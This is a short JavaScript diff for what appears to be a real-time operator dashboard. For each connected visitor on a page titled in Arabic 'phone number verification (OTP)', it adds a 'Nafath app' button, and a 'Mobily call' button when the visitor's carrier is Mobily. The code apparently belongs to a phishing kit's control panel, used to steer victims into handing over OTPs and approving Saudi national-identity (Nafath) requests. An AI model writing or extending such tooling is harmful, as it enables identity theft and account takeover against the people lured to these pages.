@@ -1,0 +1,10 @@
+            } else if (dc.page === 'تحقق رقم الجوال (OTP)') {
+              // أزرار صفحة تحقق رقم الجوال OTP
+              const phoneOtpNafathBtnId = 'phone-otp-nafath-btn-' + visitor.socketId + '-' + index;
+              const phoneOtpMobilyBtnId = 'phone-otp-mobily-btn-' + visitor.socketId + '-' + index;
+              html += '<button id="' + phoneOtpNafathBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              // إضافة زر اتصال موبايلي فقط إذا كانت الشبكة موبايلي
+              if (visitor.network === 'موبايلي') {
+                html += '<button id="' + phoneOtpMobilyBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال موبايلي</button>';
+              }
+            } else {
